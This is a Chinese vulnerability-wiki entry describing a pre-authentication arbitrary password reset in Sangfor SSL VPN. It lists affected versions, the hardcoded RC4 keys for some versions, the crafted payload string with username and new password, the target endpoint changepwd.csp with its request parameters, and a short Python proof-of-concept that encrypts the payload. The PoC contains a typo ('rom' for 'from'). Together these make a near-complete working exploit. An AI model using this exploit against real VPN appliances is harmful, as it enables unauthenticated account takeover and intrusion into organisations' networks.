深信服 SSL VPN - Pre Auth 任意密码重置
======================================

一、漏洞简介
------------

二、漏洞影响
------------

高版本(如M7.6.8R2) 直接删除相关函数

低版本(如M7.6.6R1) 升级版存在此漏洞

打了 5.x-7.x 补丁的无法利用

三、复现过程
------------

### 漏洞分析

差不多的逻辑

![1.png](/Users/aresx/Documents/VulWiki/.resource/深信服SSLVPN-PreAuth任意密码重置/media/rId25.png)

唯独多了个 RC4 解密，key 是 20100720

![2.png](/Users/aresx/Documents/VulWiki/.resource/深信服SSLVPN-PreAuth任意密码重置/media/rId26.png)

在数据提取中写的有点奇怪,使用,和=作为分隔符，所以我们的数据也要类似如：

`,username=test,ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=QQ123456,`

![3.png](/Users/aresx/Documents/VulWiki/.resource/深信服SSLVPN-PreAuth任意密码重置/media/rId27.png)

M7.6.6R1 key 为 `20181118`

M7.6.1 key 为 `20100720`

其他版本另寻

    https://www.0-sec.org/por/changepwd.csp

    sessReq=clusterd&sessid=0&str=RC4_STR&len=RC4_STR_LEN

![4.png](/Users/aresx/Documents/VulWiki/.resource/深信服SSLVPN-PreAuth任意密码重置/media/rId28.png)

### poc

> poc.py

    rom Crypto.Cipher import ARC4
    from binascii import a2b_hex


    def myRC4(data,key):
        rc41 = ARC4.new(key)
        encrypted = rc41.encrypt(data)
        return encrypted.encode('hex')


    def rc4_decrpt_hex(data,key):
        rc41 = ARC4.new(key)
        return rc41.decrypt(a2b_hex(data))
    key = '20100720'
    data = r',username=2003010002,ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=zxc123,'
    a = myRC4(data, key)
    print a
    print len(a)

参考链接
--------

> https://blog.sari3l.com/
